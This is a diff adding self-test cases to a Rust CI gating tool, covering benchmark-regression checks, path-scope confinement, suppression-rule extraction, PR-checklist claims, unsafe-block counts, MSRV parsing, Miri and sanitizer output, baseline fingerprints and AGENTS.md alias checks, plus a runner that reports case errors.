+            report_stale_exempt_arms(&entries, &arms, None, &mut live)?;
+            let mut stale_entries = entries.clone();
+            stale_entries.push("set_contains".to_string());
+            let mut stale = GateOutcome::new("bench-regression");
+            report_stale_exempt_arms(&stale_entries, &arms, None, &mut stale)?;
+
+            Ok(globbed
+                && printed
+                && untouched
+                && malformed_rejected
+                && live.violations.is_empty()
+                && stale.violations.len() == 1)
+        },
+    ),
+    (
+        "bench-regression: memory rows gate as byte counters and zero timing is not comparable",
+        || {
+            use crate::config::{BenchRegressionGate, Severity};
+            use crate::guards::perf::bounds::DiscreteMetric;
+            use crate::guards::perf::{
+                evaluate_metrics_regression_with_directives, parse_metrics, MetricValue,
+            };
+            use crate::guards::GateOutcome;
+
+            let json = r#"{"benchmarks": {
+                "core.bitset.heap.judy": {"median_ms": 0, "heap_bytes": 160, "rss_bytes": 20480},
+                "core.noop.judy": {"median_ms": 0}
+            }}"#;
+            let m = parse_metrics("bench.json", json)?;
+            let heap = m.iter().find(|x| x.name == "core.bitset.heap.judy");
+            let memory_ok = heap.is_some_and(|h| {
+                h.unit == "bytes" && h.value == MetricValue::Discrete(DiscreteMetric::new(160))
+            });
+
+            let settings = BenchRegressionGate::default();
+            let mut same = GateOutcome::new("bench-regression");
+            evaluate_metrics_regression_with_directives(
+                &[], &settings, &m, &m, "b.json", "h.json", Severity::Error, &mut same,
+            )?;
+            let zero_named = same.violations.is_empty()
+                && same
+                    .notes
+                    .iter()
+                    .any(|n| n.contains("core.noop.judy") && n.contains("not comparable"));
+
+            let grown = parse_metrics("bench.json", &json.replace("\"heap_bytes\": 160", "\"heap_bytes\": 320"))?;
+            let mut regressed = GateOutcome::new("bench-regression");
+            evaluate_metrics_regression_with_directives(
+                &[], &settings, &m, &grown, "b.json", "h.json", Severity::Error, &mut regressed,
+            )?;
+            Ok(memory_ok && zero_named && regressed.violations.len() == 1)
+        },
+    ),
+    (
+        "bench-regression: citation freshness voids stale runs and artifacts and keeps undecidable citations armed",
+        || {
+            use crate::config::MeasurementJob;
+            use crate::guards::perf::citation::{
+                check_citation_freshness, CannedInstruments, FreshnessPolicy, Unavailable,
+            };
+            let run = "https://github.com/acme/widgets/actions/runs/7";
+            let api = "repos/acme/widgets/actions/runs/7";
+            let jobs = vec![MeasurementJob {
+                job: "Perf / Counts".to_string(),
+                guard: "Guard".to_string(),
+            }];
+            let paths = vec!["src".to_string()];
+            let policy = FreshnessPolicy {
+                measurement_jobs: &jobs,
+                source_paths: &paths,
+            };
+            let canned = |conclusion: &str, status: &str| CannedInstruments {
+                responses: std::collections::BTreeMap::from([
+                    (
+                        api.to_string(),
+                        serde_json::json!({"conclusion": conclusion, "head_sha": "c1"}),
+                    ),
+                    (
+                        "repos/acme/widgets/compare/c1...h1".to_string(),
+                        serde_json::json!({"status": status}),
+                    ),
+                ]),
+                head: Some("h1".to_string()),
+                tracked: ["results/a.json".to_string()].into(),
+                last_change: [("results/a.json".to_string(), 100)].into(),
+                branch_change: Some(200),
+            };
+            let reason = format!("map_get trade in {run}");
+            let fresh = check_citation_freshness(&reason, &policy, &canned("success", "ahead"));
+            let cancelled =
+                check_citation_freshness(&reason, &policy, &canned("cancelled", "ahead"));
+            let rewritten =
+                check_citation_freshness(&reason, &policy, &canned("success", "diverged"));
+            // The artifact precedes the run URL and is stale; every citation is checked.
+            let both = format!("map_get trade in results/a.json, run {run}");
+            let stale_artifact =
+                check_citation_freshness(&both, &policy, &canned("success", "ahead"));
+            let undecidable = check_citation_freshness(&reason, &policy, &Unavailable);
+            Ok(fresh.is_fresh()
+                && cancelled.problems.len() == 1
+                && rewritten.problems.len() == 1
+                && stale_artifact.problems.len() == 1
+                && stale_artifact.problems[0].contains("results/a.json")
+                && undecidable.problems.is_empty()
+                && undecidable.undecidable.len() == 1
+                && !undecidable.is_fresh())
+        },
+    ),
+    (
+        "bench-regression: paired-ratio flags whole-interval regressions and refuses contaminated controls",
+        || {
+            use crate::config::Severity;
+            use crate::guards::perf::citation::{FreshnessPolicy, Unavailable};
+            use crate::guards::perf::paired_ratio::{evaluate_run, EvalOptions, RatioBaseline, RatioRun};
+            use crate::guards::GateOutcome;
+            let jitter = [-0.002, 0.001, 0.0, 0.002, -0.001, 0.001, 0.0, -0.002];
+            let run = |cell: f64, control: f64| -> anyhow::Result<RatioRun> {
+                let rounds: Vec<_> = jitter.iter().enumerate().map(|(i, j)| serde_json::json!({
+                    "subject": cell * (1.0 + j), "twin": 1.0,
+                    "order": if i % 2 == 0 { "subject-first" } else { "twin-first" }})).collect();
+                let ctl: Vec<_> = jitter.iter().enumerate().map(|(i, j)| serde_json::json!({
+                    "a": control * (1.0 + j), "b": 1.0,
+                    "order": if i % 2 == 0 { "a-first" } else { "b-first" }})).collect();
+                let v = serde_json::json!({
+                    "schema": "discipline-bench-ratio/v1",
+                    "provenance": {"platform": "p", "runner_class": "c", "commit": "x",
+                                   "twin": {"identity": "t", "version": "1"}},
+                    "axes": {"timing": {"adverse": "up",
+                        "cells": {"map_get": {"rounds": rounds}},
+                        "controls": {"ctl": {"rounds": ctl}}}}});
+                RatioRun::parse(&v.to_string(), "self-test")
+            };
+            let baseline = RatioBaseline::parse(&serde_json::json!({
+                "schema": "discipline-bench-ratio-baseline/v1",
+                "platforms": {"p": {"runner_class": "c", "twin": {"identity": "t", "version": "1"},
+                  "derived_from": {"runs": 4, "distinct_runners": 2, "commits": ["x"], "mixed_commits": false},
+                  "axes": {"timing": {"adverse": "up",
+                    "derived": {"axis_floor_pct": 5.0, "p95_drift_pct": 3.0, "pairwise_samples": 6,
+                      "quantile": 0.95, "axis_safety_factor": 1.25, "cell_safety_factor": 1.5,
+                      "per_cell_below_axis_allowed": false, "ceiling_pct": 50.0, "twin_axis_floor_pct": 10.0},
+                    "cells": {"map_get": {"ratio": 1.0, "floor_pct": 5.0, "worst_drift_pct": 3.0,
+                      "gateable": true, "twin_median": 1.0, "twin_floor_pct": 10.0}}}}}}
+            }).to_string(), "self-test")?;
+            let eval = |r: &RatioRun| -> anyhow::Result<GateOutcome> {
+                let mut out = GateOutcome::new("bench-regression");
+                let opts = EvalOptions {
+                    severity: Severity::Error,
+                    tolerance_pct: None,
+                    allow_cross_runner: false,
+                    require_sourced_override: false,
+                    directives: &[],
+                    policy: FreshnessPolicy { measurement_jobs: &[], source_paths: &[] },
+                    instruments: &Unavailable,
+                    location: "run.json",
+                };
+                evaluate_run(r, Some(&baseline), &opts, &mut out)?;
+                Ok(out)
+            };
+            let titles = |o: &GateOutcome| o.violations.iter().map(|v| v.title.clone()).collect::<Vec<_>>();
+            let clean = eval(&run(1.01, 1.0)?)?;
+            let regressed = eval(&run(1.20, 1.0)?)?;
+            let contaminated = eval(&run(1.60, 1.30)?)?;
+            let mut no_controls = run(1.0, 1.0)?;
+            if let Some(a) = no_controls.axes.get_mut("timing") {
+                a.controls.clear();
+            }
+            let refused = RatioRun::parse(&serde_json::to_string(&no_controls)?, "self-test").is_err();
+            Ok(clean.violations.is_empty()
+                && titles(&regressed) == ["Paired Ratio Regressed"]
+                && titles(&contaminated) == ["Paired Ratio Not Comparable"]
+                && refused)
+        },
+    ),
+    (
+        "scope-confinement: check_path_confinement discriminates authorized, forbidden, and exempt files",
+        || {
+            use globset::{Glob, GlobSetBuilder};
+            let mut exempt_b = GlobSetBuilder::new();
+            exempt_b.add(Glob::new("tests/fixtures/**")?);
+            let exempt = exempt_b.build()?;
+
+            let mut allowed_b = GlobSetBuilder::new();
+            allowed_b.add(Glob::new("src/**")?);
+            let allowed = allowed_b.build()?;
+
+            let mut forbidden_b = GlobSetBuilder::new();
+            forbidden_b.add(Glob::new(".github/**")?);
+            let forbidden = forbidden_b.build()?;
+
+            let ok = crate::guards::scope_confinement::check_path_confinement(
+                "src/lib.rs", &exempt, &allowed, true, &forbidden,
+            );
+            let forbidden_res = crate::guards::scope_confinement::check_path_confinement(
+                ".github/workflows/ci.yml", &exempt, &allowed, true, &forbidden,
+            );
+            let outside_res = crate::guards::scope_confinement::check_path_confinement(
+                "docs/guide.md", &exempt, &allowed, true, &forbidden,
+            );
+            let exempt_res = crate::guards::scope_confinement::check_path_confinement(
+                "tests/fixtures/data.bin", &exempt, &allowed, true, &forbidden,
+            );
+
+            Ok(ok.is_none()
+                && forbidden_res == Some("forbidden")
+                && outside_res == Some("outside-allowed")
+                && exempt_res.is_none())
+        },
+    ),
+    (
+        "suppression-delta: extract_suppression_rules extracts exact rules across language packs",
+        || {
+            use crate::guards::suppression_delta::extract_suppression_rules;
+            let rs_rules = extract_suppression_rules("#[allow(dead_code)]\nfn foo() {}", "#[allow(");
+            let py_rules = extract_suppression_rules("x = 1  # noqa\ny = 2  # type: ignore", "# noqa");
+            let py_ignore = extract_suppression_rules("y = 2  # type: ignore", "# type: ignore");
+            let ts_rules = extract_suppression_rules("// @ts-ignore\nconst x = 1;", "@ts-ignore");
+            let clean = extract_suppression_rules("pub fn ok() {}", "#[allow(");
+
+            Ok(rs_rules.contains(&"dead_code".to_string())
+                && py_rules.contains(&"noqa".to_string())
+                && py_ignore.contains(&"type: ignore".to_string())
+                && ts_rules.contains(&"ts-ignore".to_string())
+                && clean.is_empty())
+        },
+    ),
+    (
+        "pr-checklist: find_unsupported_claims identifies vacuous test/doc/bench claims",
+        || {
+            use crate::guards::pr_checklist::find_unsupported_claims;
+            let pr_body = "- [x] Added unit tests\n- [X] Updated documentation\n- [x] Added benchmarks\n- [ ] Unchecked item";
+            let unbacked = find_unsupported_claims(pr_body, false, false, false);
+            let backed = find_unsupported_claims(pr_body, true, true, true);
+
+            Ok(unbacked.len() == 3
+                && unbacked.iter().any(|c| c.subject == "test")
+                && unbacked.iter().any(|c| c.subject == "docs")
+                && unbacked.iter().any(|c| c.subject == "bench")
+                && backed.is_empty())
+        },
+    ),
+    (
+        "pr-checklist: a test function added or extended in any file backs a test claim",
+        || {
+            use crate::guards::pr_checklist::added_or_extended_tests;
+            let v = AssertVocabulary::default();
+            let base = analyze("fn f() {}\n#[cfg(test)]\nmod tests {\n    #[test]\n    fn a() { assert_eq!(1, 1 + 0); }\n}\n", &v)?;
+            let added = analyze("fn f() {}\n#[cfg(test)]\nmod tests {\n    #[test]\n    fn a() { assert_eq!(1, 1 + 0); }\n    #[test]\n    fn b() { assert_eq!(2, 1 + 1); }\n}\n", &v)?;
+            let untouched = analyze("fn f() { let _ = 1; }\n#[cfg(test)]\nmod tests {\n    #[test]\n    fn a() { assert_eq!(1, 1 + 0); }\n}\n", &v)?;
+            Ok(added_or_extended_tests(&base.tests, &added.tests) == 1
+                && added_or_extended_tests(&base.tests, &untouched.tests) == 0)
+        },
+    ),
+    (
+        "unsafe-budget: counts unsafe blocks across AST facts",
+        || {
+            let v = AssertVocabulary::default();
+            let src = "fn safe() {}\nfn unsafe_fn() {\n    unsafe { let _ = 1; }\n    unsafe { let _ = 2; }\n}";
+            let facts = analyze(src, &v)?;
+            Ok(facts.unsafe_sites.len() == 2)
+        },
+    ),
+    (
+        "msrv: parse_rust_version extracts valid MSRV string",
+        || {
+            let cargo_toml = "[package]\nname = \"foo\"\nversion = \"0.1.0\"\nrust-version = \"1.90\"\n";
+            let no_msrv = "[package]\nname = \"foo\"\nversion = \"0.1.0\"\n";
+            let parsed_ok = crate::guards::msrv::parse_rust_version(cargo_toml);
+            let parsed_none = crate::guards::msrv::parse_rust_version(no_msrv);
+
+            Ok(parsed_ok == Some("1.90".to_string()) && parsed_none.is_none())
+        },
+    ),
+    (
+        "miri: evaluate_miri_output distinguishes clean runs, zero-tests, and failures",
+        || {
+            use crate::guards::miri::evaluate_miri_output;
+            let clean = evaluate_miri_output(true, "test result: ok. 5 passed", "", Some("running 0 tests"));
+            let zero = evaluate_miri_output(true, "running 0 tests", "", Some("running 0 tests"));
+            let fail = evaluate_miri_output(false, "", "Undefined Behavior: pointer arithmetic out of bounds", Some("running 0 tests"));
+
+            Ok(clean.is_none() && zero == Some("zero-tests") && fail == Some("failure"))
+        },
+    ),
+    (
+        "sanitizers: evaluate_canary_diagnostic verifies canary diagnostic discrimination",
+        || {
+            use crate::guards::sanitizers::evaluate_canary_diagnostic;
+            let matched = evaluate_canary_diagnostic(
+                "fatal error: ThreadSanitizer: data race on vptr",
+                "ThreadSanitizer: data race",
+            );
+            let unmatched = evaluate_canary_diagnostic(
+                "test passed cleanly without race",
+                "ThreadSanitizer: data race",
+            );
+
+            Ok(matched && !unmatched)
+        },
+    ),
+    (
+        "baseline: fingerprinting and apply_baseline match grandfathered violations and detect stale entries",
+        || {
+            use crate::baseline::{
+                apply_baseline, compute_violation_fingerprint, BaselineEntry, DisciplineBaseline,
+            };
+            use crate::config::Severity;
+            use crate::guards::{GateOutcome, Violation};
+            use std::path::Path;
+
+            let dummy_root = Path::new(".");
+            let v1 = Violation {
+                gate: "unsafe-safety-comment",
+                severity: Severity::Error,
+                title: "Unsafe Without SAFETY Comment".to_string(),
+                file: Some("src/lib.rs".to_string()),
+                line: None,
+                message: "Unsafe block without comment".to_string(),
+                remediation: Some("Add comment".to_string()),
+            };
+            let fp1 = compute_violation_fingerprint(dummy_root, &v1);
+            anyhow::ensure!(
+                fp1.len() == 64,
+                "expected 64-char sha256 fingerprint, got {}",
+                fp1.len()
+            );
+
+            let v2 = Violation {
+                gate: "unsafe-safety-comment",
+                severity: Severity::Error,
+                title: "Unsafe Without SAFETY Comment".to_string(),
+                file: Some("src/extra.rs".to_string()),
+                line: None,
+                message: "Different unsafe block".to_string(),
+                remediation: Some("Add comment".to_string()),
+            };
+            let fp2 = compute_violation_fingerprint(dummy_root, &v2);
+            anyhow::ensure!(
+                fp1 != fp2,
+                "distinct violations must have distinct fingerprints"
+            );
+
+            let baseline = DisciplineBaseline {
+                version: 1,
+                findings: vec![
+                    BaselineEntry {
+                        gate: "unsafe-safety-comment".to_string(),
+                        rule: "Unsafe Without SAFETY Comment".to_string(),
+                        path: "src/lib.rs".to_string(),
+                        fingerprint: fp1.clone(),
+                    },
+                    BaselineEntry {
+                        gate: "unsafe-safety-comment".to_string(),
+                        rule: "Unsafe Without SAFETY Comment".to_string(),
+                        path: "src/old.rs".to_string(),
+                        fingerprint:
+                            "0000000000000000000000000000000000000000000000000000000000000000"
+                                .to_string(),
+                    },
+                ],
+            };
+
+            let mut outcome = GateOutcome::new("unsafe-safety-comment");
+            outcome.violations = vec![v1, v2];
+
+            let mut outcomes = vec![outcome];
+            let res = apply_baseline(dummy_root, &baseline, &mut outcomes);
+
+            anyhow::ensure!(
+                res.baselined_count == 1,
+                "expected 1 baselined finding, got {}",
+                res.baselined_count
+            );
+            anyhow::ensure!(
+                res.stale_count == 1,
+                "expected 1 stale finding, got {}",
+                res.stale_count
+            );
+            anyhow::ensure!(
+                outcomes[0].violations.len() == 1,
+                "expected 1 remaining violation, got {}",
+                outcomes[0].violations.len()
+            );
+            anyhow::ensure!(
+                outcomes[0].violations[0].file.as_deref() == Some("src/extra.rs"),
+                "remaining violation must be extra.rs"
+            );
+            anyhow::ensure!(
+                outcomes[0].baselined == 1,
+                "outcome baselined count must be 1"
+            );
+
+            Ok(true)
+        },
+    ),
+    (
+        "agents-md: evaluate_agents_guide catches missing AGENTS.md and forked aliases",
+        || {
+            use crate::config::AgentsMdGate;
+            use crate::guards::hygiene::evaluate_agents_guide;
+
+            let settings = AgentsMdGate::default();
+
+            // Negative control: missing AGENTS.md
+            let missing = evaluate_agents_guide(false, None, &[], &settings)?;
+            anyhow::ensure!(
+                missing.violations.len() == 1
+                    && missing.violations[0].title == "Missing AGENTS.md",
+                "missing AGENTS.md must produce Missing AGENTS.md violation"
+            );
+
+            // Positive control: AGENTS.md exists, CLAUDE.md is symlink
+            let symlinked = evaluate_agents_guide(
+                true,
+                Some("# Canonical Guide"),
+                &[("CLAUDE.md", true, true, None)],
+                &settings,
+            )?;
+            anyhow::ensure!(
+                symlinked.violations.is_empty(),
+                "symlinked alias must not produce violation"
+            );
+
+            // Positive control: AGENTS.md exists, CLAUDE.md is regular file with identical content
+            let identical = evaluate_agents_guide(
+                true,
+                Some("# Canonical Guide"),
+                &[("CLAUDE.md", true, false, Some("# Canonical Guide"))],
+                &settings,
+            )?;
+            anyhow::ensure!(
+                identical.violations.is_empty(),
+                "regular file with identical content must not produce violation"
+            );
+
+            // Negative control: AGENTS.md exists, GEMINI.md is regular file with divergent content
+            let divergent = evaluate_agents_guide(
+                true,
+                Some("# Canonical Guide"),
+                &[("GEMINI.md", true, false, Some("# Forked Guide"))],
+                &settings,
+            )?;
+            anyhow::ensure!(
+                divergent.violations.len() == 1
+                    && divergent.violations[0].title == "Forked Agent Guide",
+                "divergent regular file must produce Forked Agent Guide violation"
+            );
+
+            Ok(true)
+        },
+    ),
 ];
 
 pub fn run() -> Result<bool> {
     let mut failed = 0;
     for (name, case) in CASES {
-        let ok = matches!(case(), Ok(true));
-        println!("{} {name}", if ok { "ok  " } else { "FAIL" });
-        failed += usize::from(!ok);
+        match case() {
+            Ok(true) => println!("ok   {name}"),
+            Ok(false) => {
+                println!("FAIL {name}");
+                eprintln!("  clause evaluated to false");
+                failed += 1;
+            }
+            Err(e) => {
+                println!("FAIL {name}");
+                eprintln!("  case error: {e:#}");
+                failed += 1;
+            }
+        }
     }
     if CASES.is_empty() {
         bail!("self-test has no cases");
